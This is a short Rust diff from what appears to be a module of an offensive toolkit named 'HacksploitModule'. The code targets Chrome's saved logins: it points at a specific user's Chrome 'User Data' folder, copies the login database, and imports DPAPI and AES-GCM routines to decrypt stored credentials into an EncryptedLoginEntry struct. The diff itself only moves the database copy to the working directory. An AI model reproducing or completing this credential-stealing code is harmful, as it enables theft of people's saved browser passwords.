@@ -1,4 +1,5 @@
 use crate::HacksploitModule;
+
 use aes_gcm::aead::Aead;
 use aes_gcm::NewAead;
 use aes_gcm::{aead::generic_array::GenericArray, Aes256Gcm};
@@ -13,7 +14,7 @@ use winapi::um::wincrypt::DATA_BLOB;
 use winapi::um::{dpapi::CryptUnprotectData, winbase::LocalFree};
 
 const PATH: &str = "C:\\Users\\xpyro\\AppData\\Local\\Google\\Chrome\\User Data\\";
-const DB_COPY_NAME: &str = "C:\\Users\\xpyro\\AppData\\Local\\Google\\Chrome\\User Data\\chrome.db";
+const DB_COPY_NAME: &str = ".\\chrome.db";
 
 struct EncryptedLoginEntry {
     origin: String,
